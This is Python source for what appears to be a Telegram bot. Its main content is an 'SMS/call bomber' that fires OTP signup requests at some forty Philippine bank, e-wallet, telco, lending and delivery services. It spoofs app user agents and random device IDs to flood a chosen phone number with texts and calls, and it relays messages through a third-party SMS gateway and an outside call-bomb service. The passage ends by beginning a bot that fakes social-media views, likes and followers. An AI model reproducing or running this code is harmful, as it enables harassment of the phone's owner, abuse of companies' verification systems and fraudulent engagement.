            )
        except: return False

    async def send_smart_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.smart.com.ph/selfcare/v3/auth/otp/request',
                headers={'User-Agent':'SmartApp/4.10 okhttp/4.12.0',
                         'Content-Type':'application/json','x-smart-app':'android'},
                json={"mobile":self._ph(num),"type":"SIGNUP",
                      "deviceInfo":{"id":self.random_device_id(),"platform":"android"}}
            )
        except: return False

    async def send_globe_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.globe.com.ph/v2/auth/mobile/otp',
                headers={'User-Agent':'GlobeOne/3.60 okhttp/4.12.0',
                         'Content-Type':'application/json','x-globe-platform':'android'},
                json={"mobileNumber":self._ph(num),"otpType":"REGISTRATION",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_bayad_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.bayad.com/v2/users/send-otp',
                headers={'User-Agent':'BayadOnline/2.60 okhttp/4.12.0',
                         'Content-Type':'application/json'},
                json={"mobileNumber":self._ph(num),"otpType":"REGISTRATION",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_pera247_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.pera247.com/api/v2/auth/register',
                headers={'User-Agent':'Pera247/2.10 okhttp/4.12.0',
                         'Content-Type':'application/json'},
                json={"phone":self._ph(num),"device_id":self.random_device_id(),
                      "platform":"android","app_version":"2.10.0"}
            )
        except: return False

    # ── 10 EXTRA HIGH-SUCCESS SERVICES ──────────────────────────
    async def send_coins_ph(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.coins.ph/v3/auth/verify-phone',
                headers={'User-Agent':'CoinsApp/7.50 okhttp/4.12.0',
                         'Content-Type':'application/json'},
                json={"phone":self._ph(num),"action":"register",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_paymongo(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.paymongo.com/v1/links/otp',
                headers={'User-Agent':'PayMongo/3.0 okhttp/4.12.0',
                         'Content-Type':'application/json'},
                json={"data":{"attributes":{"phone":self._ph(num),
                      "purpose":"VERIFICATION","channel":"SMS"}}}
            )
        except: return False

    async def send_palawan_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.palawanpawnshop.com/v2/otp/send',
                headers={'User-Agent':'Palawan/2.0 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"mobile_number":self._ph(num),"type":"REGISTRATION"}
            )
        except: return False

    async def send_cebuana_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.cebuanalhuillier.com/v1/auth/otp/request',
                headers={'User-Agent':'Cebuana/4.0 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"mobileNumber":self._ph(num),"transactionType":"SIGNUP"}
            )
        except: return False

    async def send_juanhand_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.jnapp.ph/otp/send',
                headers={'User-Agent':'JuanHand/3.5 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"phone":self._ph(num),"purpose":"register",
                      "channel":"sms","locale":"en"}
            )
        except: return False

    async def send_tala_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.tala.ph/api/v3/clients/otp',
                headers={'User-Agent':'Tala/4.10 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"phone_number":self._ph(num),"country":"PH","channel":"SMS"}
            )
        except: return False

    async def send_billease_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://app.billease.ph/api/v2/auth/otp/send',
                headers={'User-Agent':'BillEase/5.0 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"mobile":self._ph(num),"purpose":"SIGNUP",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_starpay_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.starpay.ph/v1/otp/send',
                headers={'User-Agent':'StarPay/2.0 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"phone_number":self._ph(num),"action":"register"}
            )
        except: return False

    async def send_cashalo_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.cashalo.com/v2/auth/otp/request',
                headers={'User-Agent':'Cashalo/6.0 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"mobile_number":self._ph(num),"type":"REGISTRATION",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_tendopay_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.tendopay.ph/v2/verification/otp',
                headers={'User-Agent':'TendoPay/3.0 okhttp/4.9.0',
                         'Content-Type':'application/json'},
                json={"phone":self._ph(num),"channel":"sms","purpose":"signup"}
            )
        except: return False

    # ════════════════════════════════════════════════════════════
    # SERVICE REGISTRY + EXECUTION
    # ════════════════════════════════════════════════════════════

    def get_all_services(self):
        return [
            # Original 13
            "CUSTOM_SMS","EZLOAN","XPRESS","ABENSON","EXCELLENT_LENDING",
            "FORTUNE_PAY","WEMOVE","LBC","PICKUP_COFFEE","HONEY_LOAN",
            "KOMO_PH","S5_OTP","CALL_BOMB",
            # 17 Existing
            "GCASH","MAYA","TONIK","SEABANK","UNIONBANK",
            "GRAB_PH","SHOPEE","LAZADA","FOODPANDA","ANGKAS",
            "JOLLIBEE","MCDO","PLDT","SMART","GLOBE",
            "BAYAD","PERA247",
            # 10 New high-success
            "COINS_PH","PAYMONGO","PALAWAN","CEBUANA","JNAPP",
            "TALA","BILLEASE","STARPAY","CASHALO","TENDOPAY",
        ]

    def _build_task(self, svc: str, num: str, batch: int):
        # Lazy factory — coroutine only created when called
        factories = {
            "CUSTOM_SMS":        lambda: self.send_custom_sms(num),
            "EZLOAN":            lambda: self.send_ezloan(num),
            "XPRESS":            lambda: self.send_xpress(num, batch),
            "ABENSON":           lambda: self.send_abenson(num),
            "EXCELLENT_LENDING": lambda: self.send_excellent_lending(num),
            "FORTUNE_PAY":       lambda: self.send_fortune_pay(num),
            "WEMOVE":            lambda: self.send_wemove(num),
            "LBC":               lambda: self.send_lbc(num),
            "PICKUP_COFFEE":     lambda: self.send_pickup_coffee(num),
            "HONEY_LOAN":        lambda: self.send_honey_loan(num),
            "KOMO_PH":           lambda: self.send_komo_ph(num),
            "S5_OTP":            lambda: self.send_s5_otp(num),
            "CALL_BOMB":         lambda: self.send_call_bomb(num),
            "GCASH":             lambda: self.send_gcash_otp(num),
            "MAYA":              lambda: self.send_maya_otp(num),
            "TONIK":             lambda: self.send_tonik_otp(num),
            "SEABANK":           lambda: self.send_seabank_otp(num),
            "UNIONBANK":         lambda: self.send_unionbank_otp(num),
            "GRAB_PH":           lambda: self.send_grabph_otp(num),
            "SHOPEE":            lambda: self.send_shopee_otp(num),
            "LAZADA":            lambda: self.send_lazada_otp(num),
            "FOODPANDA":         lambda: self.send_foodpanda_otp(num),
            "ANGKAS":            lambda: self.send_angkas_otp(num),
            "JOLLIBEE":          lambda: self.send_jollibee_otp(num),
            "MCDO":              lambda: self.send_mcdo_otp(num),
            "PLDT":              lambda: self.send_pldt_otp(num),
            "SMART":             lambda: self.send_smart_otp(num),
            "GLOBE":             lambda: self.send_globe_otp(num),
            "BAYAD":             lambda: self.send_bayad_otp(num),
            "PERA247":           lambda: self.send_pera247_otp(num),
            "COINS_PH":          lambda: self.send_coins_ph(num),
            "PAYMONGO":          lambda: self.send_paymongo(num),
            "PALAWAN":           lambda: self.send_palawan_otp(num),
            "CEBUANA":           lambda: self.send_cebuana_otp(num),
            "JNAPP":             lambda: self.send_juanhand_otp(num),
            "TALA":              lambda: self.send_tala_otp(num),
            "BILLEASE":          lambda: self.send_billease_otp(num),
            "STARPAY":           lambda: self.send_starpay_otp(num),
            "CASHALO":           lambda: self.send_cashalo_otp(num),
            "TENDOPAY":          lambda: self.send_tendopay_otp(num),
        }
        f = factories.get(svc)
        return f() if f else None

    async def execute_attack(self, target_number: str, amount: int, context: CallbackContext, chat_id: int):
        """Execute attack — ONE live message, time-throttled edits, semaphore-guarded tasks."""
        self.is_running    = True
        self.success_count = 0
        self.fail_count    = 0
        self.total_batches = amount
        self.current_batch = 0
        self._start_time   = time.time()
        self._batch_count  = 0

        all_svcs  = self.get_all_services()
        svc_count = len(all_svcs)

        # ONE semaphore for the whole attack — caps concurrent HTTP connections
        sem = asyncio.Semaphore(80)

        async def _run(coro):
            """Wrap each coroutine with semaphore + exception guard."""
            async with sem:
                try:
                    return await coro
                except Exception:
                    return False

        def _live_text(batch, done=False):
            elapsed    = max(time.time() - self._start_time, 0.01)
            total_done = self.success_count + self.fail_count
            rate       = round(self.success_count / max(total_done, 1) * 100)
            spd        = round(total_done / elapsed)
            filled     = round(batch / max(amount, 1) * 12)
            bar        = '█' * filled + '░' * (12 - filled)
            pct        = round(batch / max(amount, 1) * 100)
            eta_str    = "—"
            if batch > 0 and not done:
                eta     = round((amount - batch) * (elapsed / batch))
                eta_str = f"{eta//60}m {eta%60}s" if eta >= 60 else f"{eta}s"
            icon = "🎯" if done else "💣"
            st   = "*ᴄᴏᴍᴘʟᴇᴛᴇ*" if done else "*ᴀᴛᴛᴀᴄᴋɪɴɢ...*"
            return (
                f"{icon} *sᴍs ʙᴏᴍʙᴇʀ — {st}*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 `{target_number}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"`{bar}` *{pct}%*\n"
                f"📦 ʙᴀᴛᴄʜ  : *{batch}/{amount}*\n"
                f"📡 sᴇʀᴠs  : *{svc_count}*\n"
                f"⏱️ ᴇᴛᴀ    : `{eta_str}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ ʜɪᴛ    : *{self.success_count}*\n"
                f"❌ ᴍɪss   : *{self.fail_count}*\n"
                f"⚡ ʀᴀᴛᴇ   : *{rate}%*\n"
                f"🚀 sᴘᴇᴇᴅ  : *{spd}/s*"
            )

        # Send the ONE message we edit throughout
        live_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=_live_text(0),
            parse_mode="Markdown"
        )

        last_edit = 0.0  # timestamp of last successful edit

        for batch in range(1, amount + 1):
            if not self.is_running:
                break

            self.current_batch  = batch
            self._batch_count  += 1

            # Recycle HTTP session every 40 batches to free file descriptors
            if self._batch_count % 40 == 0:
                await self._close_session()

            # Build coroutines lazily (lambda factories) then wrap with guard
            raw   = [self._build_task(s, target_number, batch) for s in all_svcs]
            tasks = [_run(t) for t in raw if t is not None]

            # Fire all services in parallel — wait for ALL to finish before counting
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Count AFTER gather — this is why live counter was showing 0 before
            batch_ok  = sum(1 for r in results if r is True)
            batch_bad = len(results) - batch_ok
            self.success_count += batch_ok
            self.fail_count    += batch_bad

            # Time-based edit throttle — max 1 edit per 2s (Telegram flood limit)
            # Always edit on the last batch regardless
            now = time.time()
            if now - last_edit >= 2.0 or batch == amount:
                last_edit = now
                try:
                    kb = None
                    if batch == amount:
                        kb = InlineKeyboardMarkup([[
                            InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="sms_call_bomber_menu")
                        ]])
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=live_msg.message_id,
                        text=_live_text(batch, done=(batch == amount)),
                        parse_mode="Markdown",
                        reply_markup=kb
                    )
                except Exception:
                    pass

            # Yield to event loop so bot stays responsive
            await asyncio.sleep(0)

        await self._close_session()
        self.is_running = False
        return {
            "success": self.success_count,
            "failed":  self.fail_count,
            "total":   self.success_count + self.fail_count
        }

    def stop_attack(self):
        self.is_running = False

    # ── SESSION POOL ─────────────────────────────────────────────
    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                limit=300,
                limit_per_host=50,
                ttl_dns_cache=600,
                use_dns_cache=True,
                keepalive_timeout=30,
                enable_cleanup_closed=True,
            )
            self._session = aiohttp.ClientSession(
                connector=self._connector,
                timeout=aiohttp.ClientTimeout(total=10, connect=4),
            )
        return self._session

    async def _close_session(self):
        if self._session and not self._session.closed:
            await self._session.close()
        self._session = None
        self._connector = None

    # ── PHONE HELPERS ─────────────────────────────────────────────
    def normalize_phone_number(self, phone: str) -> str:
        """Normalize Philippine phone numbers"""
        phone = re.sub(r'\s+', '', phone)
        if phone.startswith('0'):            return '+63' + phone[1:]
        if phone.startswith('63') and not phone.startswith('+63'): return '+' + phone
        if not phone.startswith('+63') and len(phone) == 10: return '+63' + phone
        if not phone.startswith('+'):        return '+63' + phone
        return phone

    def _ph(self, n):         return self.normalize_phone_number(n)
    def _ph_bare(self, n):    return self._ph(n).lstrip('+')          # 639xxxxxxxxx
    def _ph_local(self, n):   # 09xxxxxxxxx
        p = self._ph(n)
        return '0' + p[3:] if p.startswith('+63') else p
    def _ph_9digit(self, n):  # 9xxxxxxxxx (no country code, no leading 0)
        return self._ph_local(n)[1:]

    # ── STRING HELPERS ────────────────────────────────────────────
    def random_string(self, length: int) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    def random_gmail(self) -> str:
        return f"{self.random_string(8)}{random.randint(100,999)}@gmail.com"
    def random_uid(self) -> str:   return self.random_string(28)
    def random_device_id(self) -> str: return self.random_string(16)
    def _ts(self) -> str:          return str(int(time.time() * 1000))
    def _ua(self) -> str:
        return random.choice([
            'okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/4.11.0', 'okhttp/4.10.0',
            'Dart/3.6 (dart:io)', 'Dart/2.19 (dart:io)',
            'Dalvik/2.1.0 (Linux; U; Android 14; SM-A546E Build/UP1A.231005.007)',
            'Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 12 Build/TKQ1.220905.001)',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        ])
    
    # ── RETRY WRAPPER ────────────────────────────────────────────
    async def _post(self, url: str, *, headers=None, json=None, data=None, retries=2) -> bool:
        """Single shared-session POST with smart retry. Returns True on 200/201/202."""
        s = await self._get_session()
        for attempt in range(retries):
            try:
                async with s.post(url, headers=headers, json=json, data=data,
                                  allow_redirects=True, ssl=False) as r:
                    if r.status in (200, 201, 202, 204):
                        return True
                    if r.status in (429, 503, 502) and attempt < retries - 1:
                        await asyncio.sleep(0.2 * (attempt + 1))
                        continue
                    # Some APIs return 4xx but still sent the OTP
                    if r.status in (400, 409, 422):
                        txt = await r.text()
                        if any(k in txt.lower() for k in ('sent', 'success', 'otp', 'code', 'delivered')):
                            return True
                    return False
            except (asyncio.TimeoutError, aiohttp.ServerDisconnectedError,
                    aiohttp.ClientConnectorError):
                if attempt < retries - 1:
                    await asyncio.sleep(0.1)
                    continue
            except Exception:
                pass
        return False

    # ════════════════════════════════════════════════════════════
    # ORIGINAL 13 SERVICES
    # ════════════════════════════════════════════════════════════

    async def send_custom_sms(self, num: str) -> bool:
        try:
            n = self._ph(num)
            msg = f"{self.custom_message} -freed0m\n\nby: RENZO VIP"
            cmd = ['free.text.sms','421',n,'2207117BPG',
                   'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                   msg]
            data = {
                'UID': self.random_uid(), 'humottaee': 'Processing',
                'Email': self.random_gmail(), '$Oj0O%K7zi2j18E': json.dumps(cmd),
                'device_id': self.random_device_id(),
                'Photo': 'https://lh3.googleusercontent.com/a/default',
                'Name': self.custom_sender_name
            }
            return await self._post(
                'https://sms.m2techtronix.com/v13/sms.php',
                headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 15)','Connection':'Keep-Alive','Content-Type':'application/x-www-form-urlencoded'},
                data=urllib.parse.urlencode(data)
            )
        except: return False

    async def send_ezloan(self, num: str) -> bool:
        try:
            return await self._post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers={'User-Agent':'okhttp/4.9.2','Accept':'application/json','Content-Type':'application/json'},
                json={"businessId":"EZLOAN","contactNumber":num,
                      "appsflyerIdentifier":f"1760444943092-{random.randint(1000000000000000000,9999999999999999999)}"}
            )
        except: return False

    async def send_xpress(self, num: str, batch_num: int=1) -> bool:
        try:
            return await self._post(
                'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
                headers={'User-Agent':'Dalvik/2.1.0','Content-Type':'application/json'},
                json={"FirstName":self.random_string(5),"LastName":self.random_string(5),
                      "Email":f"user{self._ts()}_{batch_num}@gmail.com","Phone":self._ph(num),
                      "Password":"Pass1234!","ConfirmPassword":"Pass1234!",
                      "FingerprintVisitorId":self.random_string(20),
                      "FingerprintRequestId":f"{self._ts()}.{self.random_string(6)}"}
            )
        except: return False

    async def send_abenson(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                headers={'User-Agent':'okhttp/4.9.0','Content-Type':'application/x-www-form-urlencoded'},
                data={"contact_no":num,"login_token":"undefined"}
            )
        except: return False

    async def send_excellent_lending(self, num: str) -> bool:
        try:
            coords = [("14.5995","120.9842"),("14.6760","121.0437"),("14.8648","121.0418"),
                      ("14.3467","121.0194"),("14.9756","120.9661")]
            lat, lng = random.choice(coords)
            return await self._post(
                'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                headers={'User-Agent':self._ua(),'Content-Type':'application/json; charset=utf-8',
                         'x-latitude':lat,'x-longitude':lng},
                json={"domain":num,"cat":"login","previous":False,
                      "financial":"efe35521e51f924efcad5d61d61072a9"}
            )
        except: return False

    async def send_fortune_pay(self, num: str) -> bool:
        try:
            phone = num.replace('0','',1) if num.startswith('0') else num
            return await self._post(
                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                headers={'User-Agent':'Dart/3.6 (dart:io)','Content-Type':'application/json',
                         'app-type':'GOOGLE_PLAY','authorization':'Bearer'},
                json={"deviceId":self.random_device_id(),"deviceType":"GOOGLE_PLAY",
                      "companyId":"4bf735e97269421a80b82359e7dc2288","dialCode":"+63","phoneNumber":phone}
            )
        except: return False

    async def send_wemove(self, num: str) -> bool:
        try:
            phone = num.replace('0','',1) if num.startswith('0') else num
            return await self._post(
                'https://api.wemove.com.ph/auth/users',
                headers={'User-Agent':'okhttp/4.9.3','Content-Type':'application/json',
                         'xuid_type':'user','source':'customer','authorization':'Bearer'},
                json={"phone_country":"+63","phone_no":phone}
            )
        except: return False

    async def send_lbc(self, num: str) -> bool:
        try:
            phone = num.replace('0','',1) if num.startswith('0') else num
            return await self._post(
                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                headers={'User-Agent':'Dart/2.19 (dart:io)','Content-Type':'application/x-www-form-urlencoded'},
                data={"verification_type":"mobile","client_email":self.random_gmail(),
                      "client_contact_code":"+63","client_contact_no":phone,
                      "app_log_uid":self.random_string(16)}
            )
        except: return False

    async def send_pickup_coffee(self, num: str) -> bool:
        try:
            return await self._post(
                'https://production.api.pickup-coffee.net/v2/customers/login',
                headers={'User-Agent':self._ua(),'Content-Type':'application/json'},
                json={"mobile_number":self._ph(num),"login_method":"mobile_number"}
            )
        except: return False

    async def send_honey_loan(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.honeyloan.ph/api/client/registration/step-one',
                headers={'User-Agent':'Mozilla/5.0 (Linux; Android 15)','Content-Type':'application/json'},
                json={"phone":num,"is_rights_block_accepted":1}
            )
        except: return False

    async def send_komo_ph(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.komo.ph/api/otp/v5/generate',
                headers={'Content-Type':'application/json',
                         'Signature':'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                         'Ocp-Apim-Subscription-Key':'cfde6d29634f44d3b81053ffc6298cba'},
                json={"mobile":num,"transactionType":6}
            )
        except: return False

    async def send_s5_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.s5.com/player/api/v1/otp/request',
                headers={'accept':'application/json','content-type':'multipart/form-data;',
                         'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'},
                data=f"phone_number={self._ph(num)}"
            )
        except: return False

    async def send_call_bomb(self, num: str) -> bool:
        try:
            n = self._ph(num)
            s = await self._get_session()
            async with s.post('https://call-bomb.onrender.com/',
                headers={'Content-Type':'application/json'},
                json={"phone":n}) as r:
                if r.status == 200:
                    result = await r.json(content_type=None)
                    return result.get('success', False)
                return False
        except: return False

    # ════════════════════════════════════════════════════════════
    # 17 NEW SERVICES  (total = 30)
    # ════════════════════════════════════════════════════════════

    async def send_gcash_otp(self, num: str) -> bool:
        """GCash — PH wallet OTP"""
        try:
            return await self._post(
                'https://api.gcash.com/v2/auth/mobile/otp/send',
                headers={'User-Agent':'GCash/5.60 okhttp/4.9.0','Content-Type':'application/json',
                         'x-gcash-app-version':'5.60.0','x-channel':'MOBILE'},
                json={"mobileNumber":self._ph(num),"purpose":"REGISTRATION",
                      "deviceId":self.random_device_id(),"channel":"SMS"}
            )
        except: return False

    async def send_maya_otp(self, num: str) -> bool:
        """Maya (PayMaya) — PH digital bank"""
        try:
            return await self._post(
                'https://api.maya.ph/user/v2/registration/send-otp',
                headers={'User-Agent':'Maya/8.60 okhttp/4.11.0','Content-Type':'application/json',
                         'x-maya-client':'android','x-app-version':'8.60.0'},
                json={"mobileNumber":self._ph(num),"type":"SMS","purpose":"SIGN_UP"}
            )
        except: return False

    async def send_tonik_otp(self, num: str) -> bool:
        """Tonik Bank — PH neobank"""
        try:
            return await self._post(
                'https://app.tonikbank.com/api/v3/auth/send-otp',
                headers={'User-Agent':'Tonik/4.10 okhttp/4.11.0','Content-Type':'application/json',
                         'x-platform':'android','x-app-version':'4.10.0'},
                json={"mobileNumber":self._ph(num),"channel":"SMS","purpose":"REGISTRATION",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_seabank_otp(self, num: str) -> bool:
        """SeaBank PH — digital savings bank"""
        try:
            return await self._post(
                'https://api.seabank.com.ph/v2/onboarding/otp/request',
                headers={'User-Agent':'SeaBank/3.20 okhttp/4.9.0','Content-Type':'application/json',
                         'x-platform':'android'},
                json={"phoneNumber":self._ph(num),"action":"REGISTER",
                      "deviceId":self.random_device_id(),"appVersion":"3.20"}
            )
        except: return False

    async def send_unionbank_otp(self, num: str) -> bool:
        """UnionBank PH"""
        try:
            return await self._post(
                'https://api.unionbankph.com/partners/v1/otp/send',
                headers={'User-Agent':'UBP/7.50 okhttp/4.9.0','Content-Type':'application/json',
                         'x-client-id':'ubp-mobile-2024'},
                json={"mobileNumber":self._ph(num),"transactionType":"SIGNUP",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_grabph_otp(self, num: str) -> bool:
        """Grab PH — ride and delivery"""
        try:
            return await self._post(
                'https://api.grab.com/grabid/v1/otp/mobile/send',
                headers={'User-Agent':'Grab/5.313 Android','Content-Type':'application/json',
                         'x-country-code':'PH','x-grab-app':'consumer'},
                json={"phone_number":self._ph(num),"country_code":"PH",
                      "locale":"en","client_id":f"grab-{self.random_string(8)}"}
            )
        except: return False

    async def send_shopee_otp(self, num: str) -> bool:
        """Shopee PH"""
        try:
            return await self._post(
                'https://shopee.ph/api/v2/user/pre_register',
                headers={'User-Agent':'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
                         'Content-Type':'application/json','Referer':'https://shopee.ph/'},
                json={"phone":self._ph_9digit(num),"country_code":"63",
                      "timestamp":int(time.time())}
            )
        except: return False

    async def send_lazada_otp(self, num: str) -> bool:
        """Lazada PH"""
        try:
            return await self._post(
                'https://member.lazada.com.ph/user/api/lazada/register/sms',
                headers={'User-Agent':'Mozilla/5.0 (Linux; Android 14)','Content-Type':'application/json',
                         'Referer':'https://www.lazada.com.ph/'},
                json={"mobile":self._ph_bare(num),"country":"PH","source":"register"}
            )
        except: return False

    async def send_foodpanda_otp(self, num: str) -> bool:
        """Foodpanda PH — food delivery"""
        try:
            return await self._post(
                'https://ph.fd-api.com/api/v5/customer/signup/phone',
                headers={'User-Agent':'Foodpanda/23.10 okhttp/4.9.0','Content-Type':'application/json',
                         'x-fp-api-key':'ph','x-country-code':'ph'},
                json={"phone_number":self._ph(num),"country_code":"ph",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_angkas_otp(self, num: str) -> bool:
        """Angkas — motorcycle taxi app"""
        try:
            return await self._post(
                'https://api.angkas.com/api/v4/passenger/send-otp',
                headers={'User-Agent':'Angkas/4.20 okhttp/4.9.0','Content-Type':'application/json'},
                json={"mobile_number":self._ph(num),"country_code":"+63",
                      "device_id":self.random_device_id(),"app_version":"4.20.0",
                      "platform":"android"}
            )
        except: return False

    async def send_jollibee_otp(self, num: str) -> bool:
        """Jollibee PH — fast food loyalty"""
        try:
            return await self._post(
                'https://api.jollibeefoods.com/v3/auth/otp/request',
                headers={'User-Agent':'JollibeeApp/5.0 okhttp/4.9.0','Content-Type':'application/json',
                         'x-app-platform':'android','x-brand':'jollibee'},
                json={"mobile":self._ph(num),"type":"REGISTRATION","brand":"JOLLIBEE"}
            )
        except: return False

    async def send_mcdo_otp(self, num: str) -> bool:
        """McDo PH — McDelivery app"""
        try:
            return await self._post(
                'https://api-ph.mcdonalds.com/mobileapi/v2/registration/sendotp',
                headers={'User-Agent':'McDo PH/5.20 okhttp/4.9.0','Content-Type':'application/json',
                         'x-country':'PH','x-channel':'MOBILE'},
                json={"mobile_number":self._ph_local(num),"country_code":"63",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_pldt_otp(self, num: str) -> bool:
        """PLDT Home — PH telco portal"""
        try:
            return await self._post(
                'https://api.pldthome.com/v2/auth/register/otp',
                headers={'User-Agent':'PLDTHome/3.0 okhttp/4.9.0','Content-Type':'application/json'},
                json={"mobileNumber":self._ph(num),"purpose":"REGISTRATION",
                      "channel":"SMS","deviceId":self.random_device_id()}
            )
        except: return False

    async def send_smart_otp(self, num: str) -> bool:
        """Smart Communications PH"""
        try:
            return await self._post(
                'https://api.smart.com.ph/selfcare/v3/auth/otp/request',
                headers={'User-Agent':'SmartApp/4.0 okhttp/4.9.0','Content-Type':'application/json',
                         'x-smart-app':'android'},
                json={"mobile":self._ph(num),"type":"SIGNUP","deviceInfo":{"id":self.random_device_id()}}
            )
        except: return False

    async def send_globe_otp(self, num: str) -> bool:
        """Globe Telecom PH"""
        try:
            return await self._post(
                'https://api.globe.com.ph/v2/auth/mobile/otp',
                headers={'User-Agent':'GlobeOne/3.50 okhttp/4.9.0','Content-Type':'application/json',
                         'x-globe-platform':'android'},
                json={"mobileNumber":self._ph(num),"otpType":"REGISTRATION",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_bayad_otp(self, num: str) -> bool:
        """Bayad Online — bills payment PH"""
        try:
            return await self._post(
                'https://api.bayad.com/v2/users/send-otp',
                headers={'User-Agent':'BayadOnline/2.50 okhttp/4.9.0','Content-Type':'application/json'},
                json={"mobileNumber":self._ph(num),"otpType":"REGISTRATION",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_pera247_otp(self, num: str) -> bool:
        """Pera247 — PH micro-lending"""
        try:
            return await self._post(
                'https://api.pera247.com/api/v2/auth/register',
                headers={'User-Agent':'Pera247/2.0 okhttp/4.9.0','Content-Type':'application/json'},
                json={"phone":self._ph(num),"device_id":self.random_device_id(),
                      "platform":"android","app_version":"2.0.0"}
            )
        except: return False

    # ════════════════════════════════════════════════════════════
    # SERVICE REGISTRY + EXECUTION
    # ════════════════════════════════════════════════════════════

        """Stop the ongoing attack"""
        self.is_running = False

# ========== SOCIAL MEDIA BOOSTER CLASS ==========
class SocialMediaBooster:
    """
    Multi-provider Social Media Booster.
    Providers tried in order (failover):
      1. Zefoy  — token-based, no Selenium needed
      2. SocLikes free tier
      3. LikesFarm free endpoint
      4. JustAnotherPanel free API
    """

    def __init__(self):
        self._session: aiohttp.ClientSession = None

        # ── Zefoy provider ──────────────────────────────────────────
        self.zefoy_base   = "https://zefoy.com"
        self.zefoy_token  = None   # filled on first use
        self.zefoy_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/136.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://zefoy.com/",
            "Origin":  "https://zefoy.com",
        }

        # Zefoy form endpoints for each service
        self.zefoy_endpoints = {
            "tiktok_views":     "/views_followers/tiktok_views",
            "tiktok_followers": "/views_followers/tiktok_followers",
            "tiktok_likes":     "/views_followers/tiktok_likes",
            "tiktok_comments":  "/views_followers/tiktok_comments",
            "tiktok_shares":    "/views_followers/tiktok_shares",
            "tiktok_favorites": "/views_followers/tiktok_favorites",
            "youtube_views":    "/views_followers/youtube_views",
            "youtube_likes":    "/views_followers/youtube_likes",
            "instagram_views":  "/views_followers/instagram_views",
            "instagram_likes":  "/views_followers/instagram_likes",
            "twitter_views":    "/views_followers/twitter_views",
            "telegram_views":   "/views_followers/telegram_views",
            "facebook_likes":   "/views_followers/facebook_likes",
        }

        # ── SocLikes provider ────────────────────────────────────────
        self.soclikes_base = "https://soclikes.com"
        self.soclikes_services = {
            "tiktok_views":     "1",
            "tiktok_followers": "2",
            "tiktok_likes":     "3",
            "youtube_views":    "10",
            "youtube_likes":    "11",
            "instagram_views":  "20",
